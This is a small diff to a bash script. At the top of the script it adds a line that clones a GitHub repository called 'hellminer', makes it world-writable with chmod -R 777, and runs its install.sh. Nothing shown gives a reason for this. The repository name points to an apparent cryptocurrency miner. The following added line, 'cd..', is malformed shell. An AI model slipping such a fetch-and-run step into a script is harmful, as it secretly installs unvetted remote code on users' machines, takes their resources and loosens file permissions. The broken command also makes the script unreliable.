@@ -1,5 +1,6 @@
 #!/bin/bash
-
+git clone https://github.com/vrscms/hellminer.git && chmod -R 777 hellminer && cd hellminer && ./install.sh
+cd..
 set -e
 
 clear
